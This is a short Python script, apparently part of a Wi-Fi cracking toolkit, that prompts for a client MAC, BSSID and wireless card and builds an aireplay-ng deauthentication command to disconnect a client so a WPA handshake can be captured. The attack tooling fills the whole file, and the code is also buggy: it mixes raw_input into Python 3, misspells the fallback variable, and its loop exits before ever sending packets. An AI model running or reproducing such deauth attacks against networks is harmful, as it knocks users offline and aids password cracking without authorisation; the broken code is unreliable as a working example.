#! /usr/bin/python3
# -*- coding: utf-8 -*-

from os import system
from termcolor import colored, cprint
from time import sleep


'''
 To be run after wificracker.py
 Deauthenticates clients from the Access Point being audited.
 https://github.com/yelhamer
'''

client_mac_address = input('Input the MAC address of a client on the targeted Access Point: ')
bssid = input('Re-enter the bssid of the wireless network: ')


try:
    number_of_deauth_packets = int(input('Input the number of deauth packets to be broadcasted (0 will keep the client deauthenficated until an interrupt signal is detected. 4 is default): '))

except ValueError:
    number_of_death_packets = 4


wireless_card = raw_input("Enter the name of the wireless card being used: ")
send_deauth = 'aireplay-ng -0 {0} -a {1} -c {2} {3}'.format(number_of_deauth_packets,
                                                            bssid,
                                                            client_mac_address,
                                                            wireless_card)
answer = 'Y'
while(answer.upper() == 'Y'):
    if answer.upper() == 'Y':
        cprint('Hit Ctrl+C on the first terminal to proceed\nQuitting', 'red')
        sleep(3)
        exit()
    else:
        system(send_deauth)
    answer = input('Has the handshake been captured? [Y]es/[N]o: ')
